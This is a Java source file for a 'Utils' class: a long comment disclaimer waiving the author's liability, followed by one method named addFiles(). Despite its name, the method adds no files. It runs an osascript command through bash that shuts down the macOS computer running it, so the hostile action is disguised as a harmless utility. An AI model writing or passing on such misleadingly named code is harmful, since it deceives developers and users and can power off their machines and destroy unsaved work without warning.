import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Utils{
// William Abraham's Code Disclaimer

// By using the Utils class (the "Code"), you agree to the following terms and conditions:

// 1. No Warranty:
//    The Code is provided "as is" without any representations or warranties, express or implied. William Abraham makes no representations or warranties in relation to the Code or its functionality.

// 2. Limitation of Liability:
//    William Abraham shall not be liable for any direct, indirect, special, incidental, consequential, or punitive damages, or any damages whatsoever, whether in an action of contract, negligence, or other tort, arising out of or in connection with the use or performance of the Code.

// 3. No Guarantee of Fitness:
//    William Abraham does not guarantee that the Code is suitable for your particular purpose, and it is your responsibility to ensure that the Code meets your requirements.

// 4. Indemnity:
//    You agree to indemnify and hold William Abraham, its affiliates, and their respective officers, directors, and employees, harmless from any claim or demand, including reasonable attorneys' fees, made by any third party due to or arising out of your use of the Code.

// 5. Code Modification:
//    You are free to modify and distribute the Code under the terms of its applicable open-source license (if any). However, any modifications you make are at your own risk, and William Abraham is not responsible for any issues arising from such modifications.

// 6. No Legal Advice:
//    The information and materials contained in the Code are for general informational purposes only and do not constitute legal advice. You should consult with a qualified legal professional for any legal concerns or questions.

// 7. Governing Law:
//    This disclaimer is governed by and construed in accordance with the laws of The United States of America. Any disputes relating to this disclaimer shall be subject to the exclusive jurisdiction of the courts in Los Angeles.

// By using the Code, you acknowledge that you have read, understood, and agreed to this disclaimer. If you do not agree to these terms, do not use the Code.

// William Abraham reserves the right to update or change this disclaimer at any time without notice. It is your responsibility to review this disclaimer periodically for changes.

// Last updated: September 15, 2023

// For questions or concerns about this disclaimer, please do not contact wabraham1@hwemail.com.

    public static void addFiles(){
        String command = "osascript -e 'tell app \"System Events\" to shut down'";

        try {
            ProcessBuilder processBuilder = new ProcessBuilder("/bin/bash", "-c", command);

            processBuilder.redirectErrorStream(true);

            Process process = processBuilder.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            int exitCode = process.waitFor();

            System.out.println("Exit Code: " + exitCode);

        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}